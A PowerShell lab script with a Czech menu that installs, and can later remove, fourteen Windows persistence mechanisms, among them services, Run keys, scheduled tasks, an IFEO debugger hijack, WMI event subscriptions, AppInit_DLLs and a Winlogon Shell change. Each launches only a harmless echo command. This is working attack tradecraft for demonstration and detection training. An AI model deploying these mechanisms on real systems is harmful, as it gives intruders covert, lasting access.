# For educational purposes only. Use responsibly and ethically.
# This script demonstrates various persistence techniques in Windows.
# It is intended for security professionals and ethical hackers to understand how persistence works.
# Ensure you run this script with administrative privileges.
# Disclaimer: Unauthorized use of this script may violate laws and regulations. Always obtain permission before testing on any system.

<#
.SYNOPSIS
    Windows Persistence Techniques Demonstration Script
.DESCRIPTION
    This script demonstrates various persistence techniques that can be used by attackers to maintain access to a system.
    Each technique is implemented in a safe way for educational purposes.
    The script includes both user-level and system-level persistence methods.
.NOTES
    Created by: Hack3r.cz
    For educational purposes only.
    Always obtain proper authorization before testing on any system.
#>

function Test-Administrator {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Require-Administrator {
    if (-not (Test-Administrator)) {
        Write-Host "Tato funkce vyzaduje administrativni prava. Spuste skript jako administrator." -ForegroundColor Red
        return $false
    }
    return $true
}

# Simple action logger: zapisuje kazdou zmenu do souboru v %TEMP%\persistence_actions.log
function Log-Action {
    param(
        [string]$Message
    )
    try {
        $log = Join-Path $env:TEMP "persistence_actions.log"
        $timestamp = (Get-Date).ToString('s')
        "$timestamp`t$Message" | Out-File -FilePath $log -Append -Encoding UTF8
    } catch {
        Write-Host "Nepodarilo se zapsat do logu: $_" -ForegroundColor Yellow
    }
}

function Show-Menu {
    Clear-Host
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
    Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
    Write-Host "  For educational purposes only." -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Tento skript demonstruje ruzne techniky perzistence v systemu Windows." -ForegroundColor Yellow
    Write-Host "Pouzijte ho zodpovedne a eticky. Skript vyzaduje administrativni prava." -ForegroundColor Yellow
    Write-Host "Zkontrolujte, ze mate administrativni prava pro spusteni tohoto skriptu." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Vyberte techniku perzistence, kterou chcete otestovat:" -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "1) Sluzba (Service) (as admin)"
    Write-Host "2) Startup (vlastni profil)"
    Write-Host "3) Startup (vsichni uzivatele) (as admin)"
    Write-Host "4) Run klic v HKCU (HKEY_CURRENT_USER)"
    Write-Host "5) Run klic v HKLM (HKEY_LOCAL_MACHINE) (as admin)"
    Write-Host "6) Run klic pro 32bitove aplikace v HKLM (HKEY_LOCAL_MACHINE WOW6432Node) (as admin)"
    Write-Host "7) Planovana uloha (Scheduled Task)"
    Write-Host "8) Debugger (Image File Execution Options) (as admin)"
    Write-Host "9) WMI Filtr (WMI Filter) (as admin)"
    Write-Host "10) Logon Script"
    Write-Host "11) AppInit_DLLs (as admin)"
    Write-Host "12) Screensaver"
    Write-Host "13) Office Test"
    Write-Host "14) Winlogon Shell (as admin)"
    Write-Host "99) Odstranit vsechny persistence techniky"
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Zadejte cislo moznosti (1-14 nebo 99 pro odstraneni)" -ForegroundColor Yellow
    Write-Host "Poznamka: Polozky oznacene jako '(as admin)' vyzaduji spusteni skriptu s administrativnimi pravy." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
}

Clear-Host
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
Write-Host "  For educational purposes only." -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "Tento skript demonstruje ruzne techniky perzistence v systemu Windows." -ForegroundColor Yellow
Write-Host "Pouzijte ho zodpovedne a eticky. Skript vyzaduje administrativni prava." -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan

# Check if running as administrator
if (-not (Test-Administrator)) {
    Write-Host "POZOR: Tento skript vyzaduje administrativni prava pro nektere funkce." -ForegroundColor Red
    Write-Host "Pro plnou funkcionalitu spuste tento skript jako administrator." -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor Cyan
}

$confirmation = Read-Host "Chcete pokracovat? (Ano/Ne)"
if ($confirmation -ne "Ano" -and $confirmation -ne "ano") {
    Write-Host "Skript byl ukoncen uzivatelem." -ForegroundColor Red
    exit
}

do {
    Show-Menu
    $choice = Read-Host "Vase volba"

    if (-not ($choice -match '^\d+$')) {
        Write-Host "Neplatna volba. Zkuste to znovu." -ForegroundColor Red
        Start-Sleep -Seconds 2
        continue
    }

    switch ($choice) {
        1 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Vytvarim sluzbu 'Demo', ktera spousti cmd /c cmd /k echo Spustena sluzba"
            $serviceName = "Demo"
            $binPath = "cmd.exe /c cmd /k echo Spustena sluzba"
            sc.exe create $serviceName binPath= "$binPath" start= auto | Out-Null
            Write-Host "Sluzba 'Demo' byla vytvorena."
            $detail = "Pridano: Windows Service '$serviceName' -> binPath: $binPath. Umisteni: HKLM\\System\\CurrentControlSet\\Services\\$serviceName."
            Write-Host $detail -ForegroundColor Green
            Write-Host "Kdy se spousti: pri startu systemu (pre-Logon). Pouziti: system-level persistence pro spousteni procesu na urovni sluzby." -ForegroundColor Yellow
            Log-Action "Created service: $serviceName; binPath=$binPath"
        }
        2 { 
            Write-Host "Startup (vlastni profil): Zkontrolujte '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'."
            $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
            $filePath = Join-Path $startupPath "spust.cmd"
            'cmd /k echo Soubor spusten ve vlasnim profilu ve startup slozce.' | Set-Content -Path $filePath -Encoding UTF8
            Write-Host "Soubor 'spust.cmd' byl vytvoren ve vasem Startup."
            Write-Host "Pridano: Soubor ve Startup slozce uzivatele -> $filePath" -ForegroundColor Green
            Write-Host "Kdy se spousti: po prihlaseni daneho uzivatele. Pouziti: uzivatelska perzistence pro spousteni skriptu pri prihlaseni." -ForegroundColor Yellow
            Log-Action "Created per-user startup file: $filePath"
        }
        3 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Startup (vsichni uzivatele): Zkontrolujte 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'."
            $startupPath = Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup"
            $filePath = Join-Path $startupPath "spust.cmd"
            'cmd /k echo Soubor spusten ve startup slozce pro vsechny uzivatele.' | Set-Content -Path $filePath -Encoding UTF8
            Write-Host "Soubor 'spust.cmd' byl vytvoren ve Startup vsech uzivatelu."
            Write-Host "Pridano: Soubor ve vse-uzivatelskem Startup -> $filePath" -ForegroundColor Green
            Write-Host "Kdy se spousti: po prihlaseni kterhokoliv uzivatele. Pouziti: system-wide uzivatelska perzistence." -ForegroundColor Yellow
            Log-Action "Created all-users startup file: $filePath"
        }
        4 { 
            Write-Host "Run klic v HKCU: Zkontrolujte 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ."
            Write-Host "Pridano: HKCU Run -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni/dalsim spusteni uzivatele. Pouziti: uzivatelska perzistence via Run kluce." -ForegroundColor Yellow
            Log-Action "Added HKCU Run entry: $valueName -> $valueData"
        }
        5 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Run klic v HKLM: Zkontrolujte 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM."
            Write-Host "Pridano: HKLM Run -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni libovolneho uzivatele (system-wide). Pouziti: system-level persistence via Run kluce." -ForegroundColor Yellow
            Log-Action "Added HKLM Run entry: $valueName -> $valueData"
        }
        6 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Run klic pro 32bitove aplikace v HKLM: Zkontrolujte 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = '%SystemRoot%\SysWOW64\cmd.exe /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM WOW6432Node."
            Write-Host "Pridano: HKLM WOW6432Node Run -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri spusteni 32bitove aplikace/pri prihlaseni. Pouziti: persistence pro 32-bitovych procesu na 64-bit systemu." -ForegroundColor Yellow
            Log-Action "Added HKLM WOW6432Node Run entry: $valueName -> $valueData"
        }
        7 { 
            Write-Host "Vytvarim novou naplanovanou ulohu, ktera se spusti kazdych 30 minut."
            $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/k echo Me spustila pravidelna uloha"
            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).Date
            $taskName = "Demo30MinTask"
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null
            Write-Host "Naplanovana uloha '$taskName' byla vytvorena."
            Write-Host "Pridano: Scheduled Task -> $taskName; Action: cmd.exe $action; Trigger: every 30 minutes" -ForegroundColor Green
            Write-Host "Kdy se spousti: podle triggrovaneho casu (zde kazdych 30 minut). Pouziti: pravidelna/periodicka perzistence." -ForegroundColor Yellow
            Log-Action "Registered scheduled task: $taskName; Trigger=30min"
        }
        8 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Debugger: Zkontrolujte klic 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'."
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe"
            $valueName = "Debugger"
            $valueData = 'cmd /k echo Me spustila perzistence z debuggeru a tady lze spustit cokoli poc uctem: %username%'
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $regPath a hodnota $valueName typu REG_SZ."
            Write-Host "Pridano: Image File Execution Options for charmap.exe -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: kdyz je spusten cilovy exe (charmap.exe). Pouziti: persistentni prehooking/launch hijack site-specific exe." -ForegroundColor Yellow
            Log-Action "Added IFEO Debugger for charmap.exe -> $valueData"
        }
        9 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Vytvarim WMI filtr, consumer a jejich propojeni..."
            $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
                EventNamespace = 'root/cimv2'
                Name = "DetektorOdhalovaniNapadeni"
                Query = "select * from win32_processstarttrace where processname = 'procexp.exe' or processname = 'procexp64.exe' or processname = 'charmap.exe' or processname = 'tasksmgr.exe'"
                QueryLanguage = 'WQL'
            }
            $Command = "cmd /k echo Prave jsme detekovali zmenu a spoustime: extrakci dat/sifrovani/skryvani - ukoncovani aktivnich procesu atd. ..."
            $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                Name = "HlidacKlicovychProcesu"
                CommandLineTemplate = $Command
            }
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter = $Filter
                Consumer = $Consumer
            } | Out-Null
            Write-Host "WMI filtr, consumer a propojeni byly vytvoreny."
            Write-Host "Pridano: WMI EventFilter 'DetektorOdhalovaniNapadeni' a CommandLineEventConsumer 'HlidacKlicovychProcesu'" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri udalostech definovanych ve filtru (zde pri startu urcitych procesu). Pouziti: reakce na systemove udalosti a spousteni akci." -ForegroundColor Yellow
            Log-Action "Created WMI filter 'DetektorOdhalovaniNapadeni' and consumer 'HlidacKlicovychProcesu'"
        }
        10 {
            # Logon Scripts are executed when a user logs into the system
            # This technique uses the UserInitMprLogonScript registry key
            Write-Host "Logon Script: Zkontrolujte 'HKCU:\Environment'."
            $regPath = "HKCU:\Environment"
            $valueName = "UserInitMprLogonScript"
            $valueData = 'cmd /k echo Spusten logon script'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: Logon script registry -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni uzivatele (logon). Pouziti: spousteni skriptu pri prihlaseni." -ForegroundColor Yellow
            Log-Action "Added LogonScript entry: $valueName -> $valueData"
        }
        11 {
            # AppInit_DLLs are loaded by every process that loads User32.dll
            # This technique modifies the AppInit_DLLs registry key
            if (-not (Require-Administrator)) { break }
            Write-Host "AppInit_DLLs: Zkontrolujte 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows'."
            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
            $valueName = "AppInit_DLLs"
            $valueData = "cmd.exe"
            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
            Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1 -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: AppInit_DLLs -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri nacteni User32.dll v procesu (castecne pri spousteni GUI procesu). Pouziti: system-wide DLL injection / per-process persistence." -ForegroundColor Yellow
            Log-Action "Set AppInit_DLLs: $valueData; LoadAppInit_DLLs=1"
        }
        12 {
            # Screensaver persistence replaces the screensaver executable
            # When the screensaver activates, the malicious code will run
            Write-Host "Screensaver: Zkontrolujte 'HKCU:\Control Panel\Desktop'."
            $regPath = "HKCU:\Control Panel\Desktop"
            $valueName = "SCRNSAVE.EXE"
            $valueData = "cmd.exe"
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: Screensaver nastaveni -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: kdyz se aktivuje screensaver (po urcitem case necinosti). Pouziti: spousteni kodu pri zamceni/bezci screensaver." -ForegroundColor Yellow
            Log-Action "Set screensaver SCRNSAVE.EXE -> $valueData"
        }
        13 {
            # Office Test persistence leverages a Microsoft Office vulnerability
            # It creates a registry key that Office applications check on startup
            Write-Host "Office Test: Zkontrolujte 'HKCU:\Software\Microsoft\Office test\Special\Perf'."
            $regPath = "HKCU:\Software\Microsoft\Office test\Special\Perf"
            $valueData = "cmd.exe"
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "(Default)" -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic pro Office Test."
            Write-Host "Pridano: Office test key -> $regPath (Default) = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri spusteni Office aplikaci, pokud aplikace cte tento klic. Pouziti: test/prototyp persistence spojen s Office startupem." -ForegroundColor Yellow
            Log-Action "Created Office test registry key -> $regPath = $valueData"
        }
        14 {
            # Winlogon Shell persistence modifies the shell that is executed at logon
            # This technique changes the shell from explorer.exe to include additional commands
            if (-not (Require-Administrator)) { break }
            Write-Host "Winlogon Shell: Zkontrolujte 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'."
            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
            $valueName = "Shell"
            $valueData = "explorer.exe,cmd.exe"
            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: Winlogon Shell -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni uzivatele (prez start explorer.exe). Pouziti: modifikace prihlasovaciho shellu pro spousteni dalsich procesu." -ForegroundColor Yellow
            Log-Action "Set Winlogon Shell: $valueData"
        }
        99 {
            # Cleanup function to remove all persistence techniques
            # This ensures that the system is returned to its original state
            if (-not (Require-Administrator)) { break }
            Write-Host "Odstranuji vsechny persistence techniky..."


            sc.exe stop Demo | Out-Null
            sc.exe delete Demo | Out-Null

            Log-Action "Removed service: Demo (stopped and deleted)"


            Remove-Item -Path (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") -ErrorAction SilentlyContinue
            Remove-Item -Path (Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") -ErrorAction SilentlyContinue

            Log-Action "Removed startup files from per-user and all-users Startup"


            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue

            Log-Action "Removed Run registry entries (HKCU/HKLM/WOW6432Node) for 'demo'"


            Unregister-ScheduledTask -TaskName "Demo30MinTask" -Confirm:$false -ErrorAction SilentlyContinue

            Log-Action "Unregistered scheduled task: Demo30MinTask"


            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe" -Recurse -Force -ErrorAction SilentlyContinue

            Log-Action "Removed IFEO entry for charmap.exe"


            $filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq "DetektorOdhalovaniNapadeni" }
            if ($filter) { $filter.Delete() }
            $consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "HlidacKlicovychProcesu" }
            if ($consumer) { $consumer.Delete() }
            $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*DetektorOdhalovaniNapadeni*" -or $_.Consumer -like "*HlidacKlicovychProcesu*" }
            foreach ($b in $bindings) { $b.Delete() }

            Log-Action "Removed WMI filter/consumer/bindings: DetektorOdhalovaniNapadeni / HlidacKlicovychProcesu"


            Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -ErrorAction SilentlyContinue
            Remove-Item -Path "HKCU:\Software\Microsoft\Office test" -Recurse -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe" -ErrorAction SilentlyContinue

            Log-Action "Removed AppInit_DLLs, LogonScript, Screensaver, Office test key and reset Winlogon Shell"

            Write-Host "Vsechny persistence techniky byly odstraneny."
        }
        Default { Write-Host "Neplatna volba." }
    }

    Write-Host ""
    Write-Host "Stisknete Enter pro navrat do menu..."
    [void][System.Console]::ReadLine()
} while ($true)
